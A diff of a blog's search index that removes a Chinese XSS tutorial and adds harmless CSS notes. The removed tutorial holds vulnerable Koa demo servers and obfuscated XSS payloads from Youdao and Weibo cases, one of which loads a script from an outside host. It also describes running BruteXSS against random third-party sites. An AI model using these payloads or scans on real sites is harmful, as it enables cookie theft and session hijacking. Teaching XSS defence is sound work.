class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.body = template.replace(<span class="string">'#&#123;root&#125;'</span>, <span class="string">`welcome: `</span> + ctx.query.xss);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></p>
-<p>在下面我们可以看到，浏览器会报错，原因是现代浏览器都会有 XSS 拦截的保护机制(这并不代表因为浏览器帮我们做了而我们就可以忽略 XSS 的知识)。</p>
-<p><img src="/images/http/xss-01.gif" alt=""></p>
-<p>因此我们需要在服务器设置响应首部<code>X-XSS-Protection</code>。由于我们是要模拟 XSS ，所以我们先关闭 XSS 的保护 <code>ctx.set(&#39;X-XSS-Protection&#39;, 0)</code>，然后就可以看到以下结果，弹出 alert 弹窗。</p>
-<p><img src="/images/http/xss-02.gif" alt=""></p>
-<p>除了上面直接执行脚本之外，还可以加载非同源的js文件，嵌入 iframe 页面等等。</p>
-<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><blockquote>
-<p> 存储型 XSS，为持久型。跟反射型 XSS 的唯一区别在于是否会保存在服务器，如数据库，内存等。而当别人访问该页面时，就会受到 XSS 代码的攻击。危害相比反射型更加严重，也更隐匿。</p>
-</blockquote>
-<p>我们再次用Koa2来模拟一下，以下是简单的示例代码：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    #&#123;root&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟数据库</span></span><br><span class="line"><span class="keyword">const</span> database = &#123;</span><br><span class="line">  message: <span class="string">''</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> url = ctx.request.url;</span><br><span class="line">  <span class="keyword">if</span> (url.indexOf(<span class="string">'/blog'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    database.message = ctx.query.message;</span><br><span class="line">    ctx.body = <span class="string">'发送成功～'</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.set(<span class="string">'X-XSS-Protection'</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.body = template.replace(<span class="string">'#&#123;root&#125;'</span>, <span class="string">`来自某某人的消息：`</span> + database.message);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
-<p>大概的步骤是模拟类博客那种，黑客利用漏洞向网站发送带有 XSS 攻击脚本到服务器，服务器没有任何的安全校验直接保存到数据库 <code>database</code>，当其他用户访问带有该 XSS 脚本的页面时就被攻击了。在这里我们发送一个带用 iframe 劫持的请求到服务器，用户收到响应时就会返回该 iframe 页面。</p>
-<p><img src="/images/http/xss-03.gif" alt=""></p>
-<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><blockquote>
-<p>DOM 型 XSS，为非持久型，主要是利用前端的代码逻辑漏洞，攻击者植入恶意代码，然后浏览器解析恶意代码后执行造成的 XSS 攻击。</p>
-</blockquote>
-<p>以下是简单的示例代码：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  DOM 型 XSS</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="string">'alert(1)'</span>);</span></span><br><span class="line"><span class="javascript">  setInterval(<span class="string">'alert(2)'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="built_in">eval</span>(<span class="string">'alert(3)'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="常见-XSS-注入点"><a href="#常见-XSS-注入点" class="headerlink" title="常见 XSS 注入点"></a>常见 XSS 注入点</h3><ul>
-<li>HTML 节点内容，例如动态生成，里面包含用户输入信息，那么有可能会携带脚本；</li>
-<li>HTML 节点属性，例如图片的 onerror、onclick 事件；超链接 href、输入框 value 属性；</li>
-<li>JavaScript 代码，例如 JS 代码中存在后台注入的变量或如 react 的 dangerouslySetInnerHTML；</li>
-<li>富文本，例如富文本需要过滤需要正常展示的 html 代码之外的脚本；</li>
-</ul>
-<h3 id="常见危害"><a href="#常见危害" class="headerlink" title="常见危害"></a>常见危害</h3><ul>
-<li>获取页面数据；</li>
-<li>盗取 Cookie，获取敏感信息；</li>
-<li>劫持前端逻辑；</li>
-<li>伪装身份，利用可信任来进行不允许的操作；</li>
-<li>进行 DDoS 攻击；</li>
-<li>……</li>
-</ul>
-<h3 id="常见防御方法"><a href="#常见防御方法" class="headerlink" title="常见防御方法"></a>常见防御方法</h3><ul>
-<li>浏览器自带防御，如我们上面提到的，假如在服务器不设置<code>X-XSS-Protection</code>，现代浏览器也一样会为我们拦截大部分的 XSS 攻击(<strong>反射型 XSS，而且只会拦截出现在 HTML 内容或属性中，同时也并不是所有浏览器都支持</strong>)；</li>
-<li>节点内容转义，一般会在入数据库之前转义或者在展示的时候转义，但是入库之前转义需要<strong>注意的是，1、客户端不仅仅只有Web端，也有iOS等终端，所以可能会导致出现乱码；2、转义后的字符串跟长度跟预期的字符串长度发生变化，如’&lt;‘ 转成 ‘&lt;’，由1个字符变成了4个字符</strong>；</li>
-</ul>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 展示转义简单处理</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#x27;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2F;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>JavaScript 内容转义，同理节点内容转义，但是处理方法稍微不同，可以使用<code>JSON.stringify</code>来处理；</li>
-<li>Angular / Vue / React，不建议使用 <code>[innerHTML]/v-html/dangerouslySetInnerHTML</code> 来插入 html 元素；</li>
-<li><code>eval()/setTimeout()/setInterval()</code>，都是可以直接将字符串当代码段运行；</li>
-<li>富文本内容转义，相对于节点内容转义跟 JavaScript 内容转义，富文本内容转义比较复杂，但是大多数处理的思路都是相同的，设置转义白名单，对用户输入的内容进行过滤，可以使用 <code>js-xss</code> 库；</li>
-<li>CSP(Content-Security-Policy)，可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">内容安全策略( CSP ) - HTTP | MDN</a>，后续会说明下CSP策略；</li>
-</ul>
-<p>总体来说，我们能做的只是降低 XSS 攻击的风险，XSS 的攻防战一直存在也十分复杂。最后给一下<a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>，祝大家看得开心（溜了～</p>
-<h2 id="实战-amp-amp-案例"><a href="#实战-amp-amp-案例" class="headerlink" title="实战 &amp;&amp; 案例"></a>实战 &amp;&amp; 案例</h2><p>是否你会存在这样的侥幸心理，看完上文后觉得只要进行转义就行了，是的，其实只要进行转义就行了，问题就是从<a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>看出，过滤规则表还是蛮多的。我们来简单的实战一下。</p>
-<p>XSS 检测工具有很多，有<strong>BruteXSS</strong>，<strong>XSSer</strong>，<strong>Beef-XSS</strong>等等，可以说靠自己在本地扫描自己本地项目是否存在 XSS 漏洞了。我们在这里用<strong>BruteXSS</strong>来演示一下，<strong>仅做学习，切勿犯法。</strong></p>
-<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><blockquote>
-<p>BruteXSS 是一个根据暴力注入参数的跨站点脚本检测工具，不仅仅支持 GET 请求，还支持 POST 请求。它能从指定的词库中夹在多种 payload 进行注入，并且使用指定的 payload 和扫描检查这些存在的 XSS 漏洞的参数。</p>
-</blockquote>
-<p>我们从 github 下载<a href="https://github.com/Bosco-Lam/BruteXss" target="_blank" rel="noopener">BruteXSS</a>，之所以下载这个是因为它有 wordlist-huge.txt，也就是我们所说的 payload 词库，它约有5000条 payload 脚本。接着我们还需要安装 Python 2.7，<code>pip install colorama</code> 和 <code>pip install Mechanize</code>。</p>
-<p>执行 <code>python brutexss.py</code>，正常情况下会出现以下界面：</p>
-<p><img src="/images/http/xss-04.jpg" alt=""></p>
-<p>接着，搓搓期待的小手，我们可以到处学(sa)习(ye)了。找了好久好不容易才找到一个，于是我们就开始行动，具体的操作在这里就不讲解了，因为一步一步看操作，很简单。我们找的是使用 <code>GET</code> 方法，这类漏洞比较好找，只要对方有输入框即可(现在的浏览器以及网站多多少少都会防御部分XSS，所以不太好找)。</p>
-<p><img src="/images/http/xss-05.png" alt=""></p>
-<p>可以看到参数 <code>q</code> 有一个遗漏的注入点，于是我们就来试试看，是否真的成效。</p>
-<p><img src="/images/http/xss-06.png" alt=""></p>
-<p>(,,#ﾟДﾟ)，没想到居然成了，我试了好多几乎都被后台拦截了，这个居然成了(,,#ﾟДﾟ)。可以看出通过 payload 给出的攻击脚本能顺利的弹出 <code>1</code> 这个框。这个就是典型的<strong>反射型 XSS 攻击。</strong></p>
-<p>除此之外，我们还可以利用该工具在一些破破烂烂的边缘网站发帖来实现<strong>存储型 XSS攻击</strong>。但是这个工具也只是辅助工具，并不代表通过该工具扫描不出的就无漏洞，更多攻击者靠的可是<strong>技术以及经验。</strong></p>
-<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><blockquote>
-<p><a href="http://www.wooyun.org" target="_blank" rel="noopener">乌云</a>不在的第三个年头，想它。 ———— 鲁迅</p>
-</blockquote>
-<p>不仅仅是破破烂烂的边缘小网站，也有大公司也存在过 XSS 攻击的案例。</p>
-<h4 id="案例1-有道云笔记分享出现-XSS-攻击漏洞"><a href="#案例1-有道云笔记分享出现-XSS-攻击漏洞" class="headerlink" title="案例1 有道云笔记分享出现 XSS 攻击漏洞"></a>案例1 有道云笔记分享出现 XSS 攻击漏洞</h4><ol>
-<li>编辑完有道云笔记后保存然后通过<strong>Fiddler</strong>或<strong>Charles</strong>进行抓包；</li>
-<li>由于有道云在对 <code>iframe</code> 的 <code>srcdoc</code> 没做处理，因此可以利用这个弱点来进行注入 payload，然后分享给别人，payload 如下；</li>
-<li>修复的方法也很简单，就是对其针对 <code>iframe</code> 的 <code>srcdoc</code> 加强过滤就行了；</li>
-</ol>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#&lt;iframe class=&amp;quot;&amp;#x7a;&amp;#x68;&amp;#x6f;&amp;#x75;zhou&amp;quot; src='javAscript:confirm(1111)'/1111111wooyun/)"');' href=`vBscript:msgbox('"');` srcdoc='vBscr&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x6f;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6e;&amp;#x29;&amp;#x3b;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;ipt:msgbox('"');' alt=`</span><br><span class="line"></span><br><span class="line"><span class="string">` yuyangzhou="&lt;iframe" onclick=eval('&lt;script&gt;alert(/martinzhou/)&lt;/script&gt;'); style=&amp;quot;font-family:e/* &amp;#*/x/*&amp;#x0000000022;*/p/*&amp;gt;*/r/*onkeydown=*/ession(confirm(5));"iframe&gt;zhou&amp;quot;&gt;5&lt;/iframe&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">`&lt;div class=" \\'" src=&amp;nbsp;javAscript:confirm('1"');&amp;nbsp; href=`</span>data:q;base64,PHNjcmlwdD5hbGVydCgnQHFhYicpPC9zY3JpcHQ+<span class="string">` srcdoc= javAscript:confirm('1"');  alt="zhou" yuyangzhou=`</span><span class="string">`&lt;div/onmouseover=prompt(1)`</span> onload=alert(<span class="string">'1"'</span>); style=&amp;nbsp;font-family:e<span class="comment">/*;/*/</span>x<span class="comment">/*&amp;#34;*/</span>p<span class="comment">/*&amp;quot;*/</span>r<span class="comment">/*onclick=*/</span>ession(confirm(<span class="number">0</span>));<span class="string">""</span><span class="string">`&lt;div/onmouseover=prompt(1)&amp;nbsp;&gt;0&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
-<h4 id="案例2-新浪微博反射型-XSS"><a href="#案例2-新浪微博反射型-XSS" class="headerlink" title="案例2 新浪微博反射型 XSS"></a>案例2 新浪微博反射型 XSS</h4><ol>
-<li>在新浪微博某个分享页，有这样的一个接口<code>http://book.weibo.com/newcms/i/weibo_send.php</code>；</li>
-<li><p>当错误时返回的数据结构为如下；</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 也就是说这个接口会校验`error.referer`</span></span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="number">-1</span>,<span class="string">"message"</span>:<span class="string">"\u8bf7\u6c42\u6e90\u4e0d\u5141\u8bb8[http:\/\/error.referer]"</span>&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>当<code>error.referer</code>返回来后页面的响应报文为<code>Content-Type: text/html; charset=utf-8</code>，既然错误后的<code>Content-Type</code>为<code>text/html</code>，那么我们就可以在此做文章；</p>
-</li>
-<li>虽然在 Chrome 和 Firefox 下，referrer 都会被进行 url encode导致无法插入HTML标签。<strong>但是该问题，可以在 IE 进行 XSS 攻击；</strong></li>
-<li><p>我们在自己的服务器做一些处理，向我们服务器发起请求，即在浏览器地址栏输入如下 URL；</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// e=document.createElement("script");e.src="http://a.xxx.xyz/book.weibo.js",document.documentElement.appendChild(e)</span></span><br><span class="line"><span class="comment">// 将上面的转换为 char code 的形式</span></span><br><span class="line"><span class="comment">// 完整 URL 如下</span></span><br><span class="line">http:<span class="comment">//a.xxx.xyz/?a=&lt;img src=1 onerror=eval(String.fromCharCode(101,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,101,46,115,114,99,61,34,104,116,116,112,58,47,47,97,46,122,104,99,104,98,105,110,46,120,121,122,47,98,111,111,107,46,119,101,105,98,111,46,106,115,34,44,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,97,112,112,101,110,100,67,104,105,108,100,40,101,41))&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>请求后我们的服务器会重定向跳转到<code>http://book.weibo.com/newcms/i/weibo_send.php</code>，这时候的 <code>error.referer</code> 就会被我们植入 XSS 攻击脚本了。</p>
-</li>
-</ol>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>可以看到，大多数漏洞都是处于绕来绕去最后发现漏洞的地方没有进行过滤转义处理。正所谓 <strong>攻击千万条，安全第一条。过滤不规范，开发两行泪。</strong></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本 - 维基百科，自由的百科全书</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting" target="_blank" rel="noopener">跨站脚本攻击(Cross-site scripting) - 术语表 | MDN</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">内容安全策略( CSP ) - HTTP | MDN</a></li>
-<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS" target="_blank" rel="noopener">Cross-site Scripting (XSS)</a>)</li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> http </category>
-            
-            <category> web-secure </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> http </tag>
-            
-            <tag> web-secure </tag>
             
         </tags>
         
@@ -3285,6 +3285,62 @@
     </entry>
     
     <entry>
+      <title><![CDATA[css的一些小记]]></title>
+      <url>https://lucius0.github.io/2017/03/19/archivers/css-notes/</url>
+      <content type="html"><![CDATA[<h2 id="before-和-after"><a href="#before-和-after" class="headerlink" title=":before 和 :after"></a>:before 和 :after</h2><p>伪类<code>:before</code>和<code>:after</code>默认是一个行内元素，所以这个元素设置<code>width/height</code>是无效的，就像给<code>a</code>元素设置<code>width/height</code>一样，但是可以通过设置<code>position:absolute;</code>，对这个元素的<code>display</code>属性计算为<code>inline-block</code>值，但是设置了<code>width/height</code>针对的是<code>:before/:after</code>生成的匿名替换元素，而不是其中的<code>content</code>。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 无效</span><br><span class="line">span:before &#123;</span><br><span class="line">    content: url(xxx.png);</span><br><span class="line">    width: 800px;</span><br><span class="line">    height: 600px;</span><br><span class="line">&#125;</span><br><span class="line">// 可以</span><br><span class="line">span:before &#123;</span><br><span class="line">    content: '';</span><br><span class="line">    background-image:url(xxx.png);</span><br><span class="line">    background-size:800px 600px;</span><br><span class="line">    width: 800px;</span><br><span class="line">    height: 600px;</span><br><span class="line">    position: absolute; // 设置定位类型</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h2><h3 id="元素间隔"><a href="#元素间隔" class="headerlink" title="元素间隔"></a>元素间隔</h3><p><code>inline-block</code>使得元素水平排列，但如果两个<code>inline-block</code>元素之间存在<strong>空格</strong>或者<strong>换行</strong>就会出现奇怪的元素间隔，即使使用了<code>{padding: 0; margin: 0}</code>。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#text p &#123; display: inline-block; padding: 10px; background-color: red; color: #fff;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/css/css-27.png" alt=""></p>
+<p>常见的解决方法：</p>
+<p>1、元素之间不要存在<strong>空格</strong>或者<strong>换行符</strong>；</p>
+<p>2、父容器的<code>font-size:0</code>。</p>
+<p>去除<code>inline-block</code>之间的间隔有很多种方法，可以参考张鑫旭老师的<a href="http://www.zhangxinxu.com/wordpress/2012/04/inline-block-space-remove-%E5%8E%BB%E9%99%A4%E9%97%B4%E8%B7%9D/" target="_blank" rel="noopener">去除inline-block元素间间距的N种方法</a></p>
+<h3 id="元素对齐问题"><a href="#元素对齐问题" class="headerlink" title="元素对齐问题"></a>元素对齐问题</h3><p>两<code>inline-block</code>元素，不存在文本的情况下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#test p &#123;display: inline-block;&#125;</span><br><span class="line">.c1, .c2 &#123;width: 100px; height: 100px;&#125;</span><br><span class="line">.c1 &#123;border: 1px solid #f00;&#125;</span><br><span class="line">.c2 &#123;border: 1px solid #000;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"c1"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"c2"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/css/css-28.png" alt=""></p>
+<p>两<code>inline-block</code>元素存在文本的情况下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#test p &#123;display: inline-block;&#125;</span><br><span class="line">.c1, .c2 &#123;width: 100px; height: 100px;&#125;</span><br><span class="line">.c1 &#123;border: 1px solid #f00;&#125;</span><br><span class="line">.c2 &#123;border: 1px solid #000;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"c1"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"c2"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/css/css-29.png" alt=""></p>
+<p>常见的解决方法：</p>
+<p>给图片或者背景设置<code>vertical-align: top</code>即可，或者给有文本的元素设置<code>overflow:hidden</code></p>
+<p>出现这种的原因是因为<code>inline-block</code>的默认属性是<code>vertical-align: baseline</code>，即以父元素的基线对齐，但当出现文本的时候，则会影响了对齐的基线。</p>
+<p>来自官方的答案：<a href="https://link.zhihu.com/?target=http%3A//www.w3.org/TR/CSS21/visudet.html%23leading" target="_blank" rel="noopener">“Visual formatting model details”</a></p>
+<blockquote>
+<p>The baseline of an ‘inline-block’ is the baseline of its last line box in the normal flow, unless it has either no in-flow line boxes or if its ‘overflow’ property has a computed value other than ‘visible’, in which case the baseline is the bottom margin edge.</p>
+</blockquote>
+<h2 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h2><p>页面上的每一个元素都可以看成一个盒模型。</p>
+<p><img src="/images/css/css-30.png" alt=""></p>
+<p>可以知道盒模型由四部分组成<code>content + padding + border + margin</code>，因此一个元素的宽度应该是：<code>总宽度 = margin-left + border-left + padding-left + width + padding-right + border-right + margin-right</code>。</p>
+<p>但是以上有问题的是，在<strong>IE(低于IE 9)</strong>的宽度为：<code>总宽度 = width + margin-right + margin-left</code>。因此出现了<code>box-sizing: border-box</code>的属性，当设置<code>box-sizing: border-box</code>属性时，<code>border</code> 和 <code>padding</code> 就被包含在了宽高之内，和 IE 之前的标准是一样的。</p>
+<h2 id="Chrome-小于12号字体"><a href="#Chrome-小于12号字体" class="headerlink" title="Chrome 小于12号字体"></a>Chrome 小于12号字体</h2><p>相对于其他的浏览器，chrome的默认最小字体只能是<code>12px</code>，无论你设置再小也是只能是<code>12px</code>，那假如有一个需求是要你兼容其他平台，包括chrome的字体表现小于<code>12px</code>的呢？可以使用css3的一个属性<code>transform: scale(n)</code>。</p>
+<h2 id="text-overflow-ellipsis"><a href="#text-overflow-ellipsis" class="headerlink" title="text-overflow: ellipsis"></a>text-overflow: ellipsis</h2><p><strong>多行文本</strong>在当前标准是不支持<code>text-overflow: ellipsis</code>。在草案中有一个不规范的属性<code>-webkit-line-clamp: &lt;number&gt;</code> <a href="http://developer.apple.com/safari/library/documentation/AppleApplications/Reference/SafariCSSRef/Articles/StandardCSSProperties.html#//apple_ref/doc/uid/TP30001266-UnsupportedProperties" target="_blank" rel="noopener">(unsupported WebKit property)</a>倒是可以支持这一需求，但是目前也只是在草案中。<code>text-overflow: ellipsis</code>需要<code>overflow: hidden</code>跟<code>white-space: nowrap</code>的支持，在IE 6还需要给元素设置<strong>宽度</strong>，至于多行文本，可以用<em>Jquery插件</em>的<em>Jquery-dotdotdot</em>，或者通过伪元素<code>:after</code>也可以很巧妙的解决这个问题。</p>
+<p>在此帖一下张老师的分析以及他的方案：<a href="http://www.zhangxinxu.com/wordpress/2009/09/%E5%85%B3%E4%BA%8E%E6%96%87%E5%AD%97%E5%86%85%E5%AE%B9%E6%BA%A2%E5%87%BA%E7%94%A8%E7%82%B9%E7%82%B9%E7%82%B9-%E7%9C%81%E7%95%A5%E5%8F%B7%E8%A1%A8%E7%A4%BA/" target="_blank" rel="noopener">关于文字内容溢出用点点点(…)省略号表示</a></p>
